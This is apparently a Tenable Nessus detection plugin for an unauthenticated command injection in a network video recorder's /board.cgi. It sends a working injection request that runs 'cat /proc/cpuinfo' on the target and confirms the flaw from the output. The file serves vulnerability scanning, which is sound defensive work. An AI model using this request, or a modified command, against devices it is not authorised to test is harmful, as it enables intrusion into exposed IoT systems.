#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(104124);
  script_version("1.4");
  script_cvs_date("Date: 2018/08/08 12:52:13");


  script_name(english:"Vocran NVR Remote Command Execution");
  script_summary(english:"Attempts to execute a command on the remote device.");

  script_set_attribute(attribute:"synopsis", value:
"The Vocran network video recorder is affected by a remote command
execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Vocran network video recorder is affected by a remote
command execution vulnerability due to improper sanitization of
user-supplied input passed via /board.cgi. An unauthenticated
remote attacker can exploit this, via a specially crafted URL, to
execute arbitrary commands on the device.

This vulnerability has been used by the IoT Reaper botnet.

Note that Nessus has detected this vulnerability by reading the
contents of the file /proc/cpuinfo.");
  script_set_attribute(attribute:"see_also", value:"https://blogs.securiteam.com/index.php/archives/3445");
  # http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?197042fe");
  script_set_attribute(attribute:"solution", value:
"At time of publication, Vacron had not yet released a patch. Users
should take precautions to ensure affected devices are not exposed
to the internet and that the devices are properly isolated on the
local network.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");

  script_set_attribute(attribute:"vuln_publication_date",value:"2017/10/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/10/24");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 Tenable Network Security, Inc.");

  script_dependencies("vacron_nvr_detect.nbin");
  script_require_keys("installed_sw/Vocran NVR");
  script_require_ports("Services/www", 80, 8081, 9000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("http.inc");

appname = 'Vocran NVR';
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:8081, embedded:TRUE);
install = get_single_install(app_name:appname, port:port);

# note that the device won't decode %2f to /
uri = "/board.cgi?cmd=cat%20/proc/cpuinfo";
res = http_send_recv3(method:'GET', item:uri, port:port, exit_on_fail:TRUE);

# validate the command execute
if ("200 OK" >!< res[0] ||
    "#cat /proc/cpuinfo" >!< res[2] ||
    "Processor" >!< res[2])
{
  audit(AUDIT_HOST_NOT, "an AVTech device");
}

security_report_v4(port:port, severity:SECURITY_HOLE, generic:TRUE,
    cmd:"cat /proc/cpuinfo", request:make_list(build_url(qs:uri, port:port)),
    output: res[2]);
